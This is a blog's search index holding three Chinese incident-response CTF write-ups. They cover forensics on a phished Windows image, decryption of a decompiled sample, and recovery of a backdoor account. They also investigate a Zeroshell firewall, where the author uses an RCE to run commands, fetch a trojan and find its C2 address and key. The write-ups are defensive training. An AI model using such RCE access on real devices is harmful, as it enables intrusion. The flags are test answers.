<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>启航杯网络安全挑战赛-Win取证</title>
      <link href="/2025/01/26/%E5%90%AF%E8%88%AA%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Win%E5%8F%96%E8%AF%81/"/>
      <url>/2025/01/26/%E5%90%AF%E8%88%AA%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Win%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="背景信息"><a href="#背景信息" class="headerlink" title="背景信息"></a>背景信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。</span><br></pre></td></tr></table></figure><h2 id="环境仿真"><a href="#环境仿真" class="headerlink" title="环境仿真"></a>环境仿真</h2><p>FTK挂载Windows.E01，导出C:\Windows\System32\config文件夹下的SAM、SYSTEM、SECURITY文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126190001740.png" alt="image-20250126190001740"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126190040548.png" alt="image-20250126190040548"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126185913440.png" alt="image-20250126185913440"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126190803348.png" alt="image-20250126190803348"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126190942348.png" alt="image-20250126190819932"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126191109519.png" alt="image-20250126191109519"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到两个用户</span><br><span class="line">admin:123456</span><br><span class="line">HackY$:123456</span><br></pre></td></tr></table></figure><blockquote><p>参考链接</p><p><a href="https://blog.csdn.net/NDASH/article/details/109295885">【电子取证：FTK Imager 篇】DD、E01系统镜像动态仿真_accessdata ftk imager教程</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/120914608">Vmware安装虚拟机出现attempting to start up from？</a></p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126190819932.png" alt="image-20250126190819932"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126194447202.png" alt="image-20250126194447202"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126194812945.png" alt="image-20250126194812945"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126194746553.png" alt="image-20250126194746553"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126194851453.png" alt="image-20250126194851453"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126194928424.png" alt="image-20250126194928424"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126195101585.png" alt="image-20250126195101585"></p><p>出现以下报错：<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126195156304.png" alt="image-20250126195156304"><br>关闭虚拟机修改此虚拟机配置文件</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126195430813.png" alt="image-20250126195430813"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126195532955.png" alt="image-20250126195532955"><br>将此行删掉再重新启动虚拟机，<br>使用Admin:123456登陆<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126195748848.png" alt="image-20250126195748848"></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-找出系统中蛤客的ip地址及端口"><a href="#1-找出系统中蛤客的ip地址及端口" class="headerlink" title="1.找出系统中蛤客的ip地址及端口"></a>1.找出系统中蛤客的ip地址及端口</h3><p>做最后一题找启动项中藏的flag时<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126211051798.png" alt="image-20250126211051798"><br>查HackY$用户 发现了可执行程序<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126212025905.png" alt="image-20250126212025905"></p><h3 id="2-蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码"><a href="#2-蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码" class="headerlink" title="2.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码"></a>2.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126191309965.png" alt="image-20250126191309965"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : HackY$</span><br><span class="line">  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">用户名为HackY$</span><br><span class="line">密码为123456</span><br></pre></td></tr></table></figure><h3 id="3-蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值"><a href="#3-蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值" class="headerlink" title="3.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值"></a>3.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值</h3><p>在Admin桌面下存在Hacker_.exe<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126202952563.png" alt="image-20250126202952563"><br>是个python打包的exe<br>pyinstxtractor逆向<br><code>python pyinstxtractor.py Hacker_.exe</code><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126235404813.png" alt="image-20250126235404813"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126203827121.png" alt="image-20250126203827121"><br>添加magic number<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126203607426.png" alt="image-20250126203607426"><br>Pycdc反编译或者<a href="https://pylingual.io/">在线网站转pyc</a></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126203942409.png" alt="image-20250126203942409">源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: 1.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.11a7e (3495)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i][key, i, <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    encrypted_data = cipher.encrypt(pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">aes_key, message</span>):</span><br><span class="line">    aes_encrypted = aes_encrypt(aes_key, message)</span><br><span class="line">    base64_encoded = base64.b64encode(aes_encrypted)</span><br><span class="line">    xor_key = <span class="string">b&#x27;qihangcup&#x27;</span></span><br><span class="line">    xor_encrypted = xor_encrypt(base64_encoded, xor_key)</span><br><span class="line">    final_encrypted = base64.b64encode(xor_encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_encrypted</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    aes_key = <span class="string">b&#x27;acf8bafa15f8cb03&#x27;</span></span><br><span class="line">    message = <span class="string">&#x27;QHCTF&#123;xxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">    encrypt_message1 = <span class="string">&#x27;HgIlNCQUF0MZRA0FMhwODBsTNjM4OQ8RMA81SCImFhQeVkQdCUJfMBs0Mx0fGVowIyoTJ0cdHCwKVwxIOQQCRA==&#x27;</span></span><br><span class="line">    encrypted_message = encrypt_message(aes_key, message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密结果:&#x27;</span>, encrypted_message)</span><br></pre></td></tr></table></figure><p>解密脚本（用了网上一位师傅的脚本）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密：逻辑</span><br><span class="line">将密文enc进行Base64解码。</span><br><span class="line">使用 XOR 密钥进行解密。</span><br><span class="line">再次进行 Base64 解码。</span><br><span class="line">使用 AES 密钥进行 AES-ECB 模式解密</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        a += <span class="built_in">chr</span>(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">return</span> a.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;HgIlNCQUF0MZRA0FMhwODBsTNjM4OQ8RMA81SCImFhQeVkQdCUJfMBs0Mx0fGVowIyoTJ0cdHCwKVwxIOQQCRA==&quot;</span></span><br><span class="line">data = base64.b64decode(enc)</span><br><span class="line"></span><br><span class="line">xor_key = <span class="string">b&#x27;qihangcup&#x27;</span></span><br><span class="line">xor_encrypted = xor_encrypt(data, xor_key)</span><br><span class="line"></span><br><span class="line">data = base64.b64decode(xor_encrypted)</span><br><span class="line"></span><br><span class="line">aes_key = <span class="string">b&#x27;acf8bafa15f8cb03&#x27;</span></span><br><span class="line">cipher = AES.new(aes_key, AES.MODE_ECB)</span><br><span class="line">decrData = unpad(cipher.decrypt(data), AES.block_size)</span><br><span class="line"><span class="built_in">print</span>(decrData)</span><br><span class="line"><span class="comment"># b&#x27;QHCTF&#123;8b0c14a8-5823-46fd-a547-0dcdc404a7ed&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126200304206.png" alt="image-20250126200304206"><br>存在flag.zip<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126210314098.png" alt="image-20250126210314098"><br>提示我们去查环境变量<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126210445603.png" alt="image-20250126210445603"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126210508893.png" alt="image-20250126210508893"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126210616459.png" alt="image-20250126210616459"></p><h3 id="4-蛤客在系统数据库中藏了一些东西，请你找出其中的flag值"><a href="#4-蛤客在系统数据库中藏了一些东西，请你找出其中的flag值" class="headerlink" title="4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值"></a>4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值</h3><p>仿真后，Win+R打开运行框 发现历史记录regedit<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126200003571.png" alt="image-20250126200003571"><br>电脑桌面存在111.reg文件，里面也有此flag</p><h3 id="5-小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么"><a href="#5-小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么" class="headerlink" title="5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么"></a>5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126200219074.png" alt="image-20250126200219074"><br>打开资源管理器 发现大量日志文件，点击打开文件却消失了，可以使用DiskGenius进行恢复，或者将磁盘重新载入</p><p><code>过滤port=</code> 发现唯有这个最特殊<br>或者查看其他日志  能发现 这段时间在数据传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">则就为 223.104.132.99:20000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126231746593.png" alt="image-20250126231746593"></p><p>排查2024-12-23 14:40:01左右的会话<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126232927886.png" alt="image-20250126232927886"></p><p>定位到2024-12-23 14:39:59 通过35600端口进行收发数据<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126233113621.png" alt="image-20250126233113621"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126233238499.png" alt="image-20250126233238499"><br>在2024-12-23 14:53:00 断开会话，共781s</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Todesk</span><br><span class="line">781</span><br><span class="line">223.104.132.99</span><br></pre></td></tr></table></figure><h3 id="6-请你找出蛤客在启动项中藏的flag"><a href="#6-请你找出蛤客在启动项中藏的flag" class="headerlink" title="6.请你找出蛤客在启动项中藏的flag"></a>6.请你找出蛤客在启动项中藏的flag</h3><p>win + R输入shell:startup<br>Admin用户中为空</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250126211051798.png" alt="image-20250126211051798"><br>官方说在C∶&#x2F;Windows&#x2F;system32&#x2F;tasks&#x2F;Microsoft&#x2F;start<br>被Windows defender 杀了<br>将H:\ProgramData\Microsoft\Windows Defender\Quarantine文件夹提取<br>（也可仿真进行提取）<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250127224635052.png" alt="image-20250127224635052"></p><p>使用<a href="https://github.com/CyberGoatherder/WinDefReleaser">CyberGoatherder&#x2F;WinDefReleaser: Python tool to parse and decrypt files quarantined by windows defender</a>进行恢复<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250127224952739.png" alt="image-20250127224952739"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250127225245700.png" alt="image-20250127225245700"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250127225310518.png" alt="image-20250127225310518"></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>威胁检测与网络流量分析_zeroshell</title>
      <link href="/2024/12/16/%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/"/>
      <url>/2024/12/16/%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/</url>
      
        <content type="html"><![CDATA[<h2 id="背景信息"><a href="#背景信息" class="headerlink" title="背景信息"></a>背景信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</span><br><span class="line"></span><br><span class="line">文件名：2e9c01da1d333cb8840968689ed3bc57.7z</span><br><span class="line">文件大小：270.1m</span><br><span class="line">下载链接1：https://pan.baidu.com/s/1N58ui-5Ll4Zk7Ys4SUGFvw 提取码：GAME</span><br><span class="line">下载链接2：https://drive.google.com/file/d/19VKjCBaF_X2VvexHGwS__TRhnS39njVT/view</span><br><span class="line">解压密码：11b0526b-9cfb-4ac4-8a75-10ad9097b7ce</span><br><span class="line">来源：长城杯&amp;CISCN官网</span><br></pre></td></tr></table></figure><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><ol><li>使用VMware(推荐VMware17)加载zeroshell虚拟机</li><li>打开虚拟网络编辑器<br> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217165610596.png" alt="image-20241217165610596"></li><li>选择VMnet8 Net模式网卡，选择更改配置<br> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217170338381.png" alt="image-20241217170338381"></li><li>选择VMnet8 网络，修改子网IP为61.139.2.0，再点击应用和确定<br> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217170415113.png" alt="image-20241217170415113"></li><li>启动虚拟机，等虚拟机启动完成后，浏览器打开<a href="http://61.139.2.100/">http://61.139.2.100</a> 即可访问zeroshell防火墙环境<br> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217170823445.png" alt="image-20241217170823445"></li></ol><p>如启动虚拟机 遇以下报错</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217165827583.png" alt="image-20241217165827583"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217170634861.png" alt="image-20241217170634861"></p><p>说明虚拟机版本与VMware版本不兼容 可以直接编辑配置文件（zeroshell.vmx)</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217170138853.png" alt="image-20241217170138853"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改低于20的数值 我在这里修改为了16 继续启动虚拟机即可正常启动</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag-结果提交形式：flag-xxxxxxxxx"><a href="#1-从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag-结果提交形式：flag-xxxxxxxxx" class="headerlink" title="1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}"></a>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</h3><blockquote><p> <code>ip.addr == 61.139.2.100 &amp;&amp; http</code></p><p>防火墙 IP 为 61.139.2.100 猜测攻击者入口为web HTTP</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217193326115.png" alt="image-20241217193326115"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217193427479.png" alt="image-20241217193427479"><br>flag存在于tcp流243 base64解码即可得出<br>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</p><h3 id="2-通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag-xxxxxxxxxx"><a href="#2-通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag-xxxxxxxxxx" class="headerlink" title="2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}"></a>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}</h3><blockquote><p>由上题很明显看出攻击者执行了 ps -ef 防火墙存在RCE</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217194652788.png" alt="image-20241217194652788"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;flag&#x27;</span><br><span class="line">存在</span><br><span class="line">/DB/_DB.001/flag</span><br><span class="line">/Database/flag</span><br><span class="line">cat /DB/_DB.001/flag</span><br><span class="line">flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217194849703.png" alt="image-20241217194849703"></p><h3 id="3-找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag-xxxx-，如flag-www-abc-com-或-flag-16-122-33-44"><a href="#3-找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag-xxxx-，如flag-www-abc-com-或-flag-16-122-33-44" class="headerlink" title="3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}"></a>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{<a href="http://www.abc.com}/">www.abc.com}</a> 或 flag{16.122.33.44}</h3><blockquote><p>netstat -ano 查看网络信息</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217195633640.png" alt="image-20241217195633640"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;202.115.89.103&#125;</span><br></pre></td></tr></table></figure><h3 id="4-请写出木马进程执行的本体文件的名称，结果提交形式：flag-xxxxx-，仅写文件名不加路径"><a href="#4-请写出木马进程执行的本体文件的名称，结果提交形式：flag-xxxxx-，仅写文件名不加路径" class="headerlink" title="4.请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径"></a>4.请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径</h3><blockquote><p><code>ps</code>查看进程</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217195913680.png" alt="image-20241217195913680"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现进程运行隐藏文件 .nginx </span><br><span class="line">flag&#123;.nginx&#125;</span><br></pre></td></tr></table></figure><h3 id="5-请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag-xxxx"><a href="#5-请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag-xxxx" class="headerlink" title="5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag{xxxx}"></a>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag{xxxx}</h3><blockquote><p>使用wget获取<code>cat /tmp/.nginx</code>页面</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217201258624.png" alt="image-20241217201258624"><br>是一个elf执行文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217201512209.png" alt="image-20241217201512209"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存在外联IP后面 可能就为加密密钥</span><br><span class="line">flag&#123;11223344qweasdzxc&#125;</span><br></pre></td></tr></table></figure><h3 id="6-请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag-xxxx-，如flag-a-b-c"><a href="#6-请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag-xxxx-，如flag-a-b-c" class="headerlink" title="6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}"></a>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}</h3><blockquote><p><code>grep -nr &#39;.nginx&#39; /var</code> 在&#x2F;var目录下检索所有文件内容 内容中是否包含.nginx</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20241217202004448.png" alt="image-20241217202004448"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/var/register/system/startup/scripts/nat/File&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第五章-linux实战-挖矿（一）</title>
      <link href="/2024/07/20/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2024/07/20/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/48</span><br><span class="line">应急响应工程师在内网服务器发现有台主机 cpu 占用过高，猜测可能是中了挖矿病毒，请溯源分析，提交对应的报告给应急小组</span><br><span class="line">虚拟机账号密码 root websecyjxy web 端口为 8081</span><br><span class="line">1.黑客的IP是？ flag格式：flag&#123;黑客的ip地址&#125;，如：flag&#123;127.0.0.1&#125;</span><br><span class="line">2.黑客攻陷网站的具体时间是？ flag格式：flag&#123;年-月-日 时:分:秒&#125;，如：flag&#123;2023-12-24 22:23:24&#125;</span><br><span class="line">3.黑客上传webshell的名称及密码是？ flag格式：flag&#123;黑客上传的webshell名称-webshell密码&#125;，如：flag&#123;webshell.php-pass&#125;</span><br><span class="line">4.黑客提权后设置的后门文件名称是？ flag格式：flag&#123;后门文件绝对路径加上名称&#125;，如：flag&#123;/etc/passwd&#125;</span><br><span class="line">5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag</span><br></pre></td></tr></table></figure><h3 id="1-黑客的IP是？-flag格式：flag-黑客的ip地址-，如：flag-127-0-0-1"><a 